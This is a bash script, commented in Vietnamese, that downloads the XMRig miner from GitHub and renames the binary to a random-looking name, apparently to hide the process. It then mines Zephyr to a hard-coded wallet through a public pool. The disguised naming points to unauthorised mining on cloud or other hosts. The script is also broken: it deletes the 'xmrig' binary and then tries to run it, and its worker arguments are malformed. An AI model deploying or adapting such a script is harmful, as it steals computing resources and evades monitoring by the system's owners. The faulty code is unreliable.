#!/bin/bash

# Định nghĩa các biến cần thiết
VERSION=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "tag_name" | awk '{print substr($2, 2, length($2)-3)}')
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
POOL=ca-zephyr.miningocean.org:5432
USERNAME=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB
ALGO=rx/0
DONATE=1

if [ -z "$VERSION" ]; then
  echo "Error: Unable to fetch XMRig version."
  exit 1
fi

# Tải xuống và giải nén XMRig
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz
tar -xvf xmrig-$VERSION-linux-x64.tar.gz
rm -f xmrig-$VERSION-linux-x64.tar.gz
cd xmrig-$VERSION

# Đổi tên tệp thực thi và sao chép để sử dụng cho GPU
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f xmrig

# Bắt đầu đào coin trên GPU với XMRig
./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.ws-p x -a $ALGO -k --tls

# Bắt đầu đào coin trên CPU với XMRig
./xmrig --donate-level $DONATE -o $POOL -u $USERNAME.ws-c x -a $ALGO -k --tls
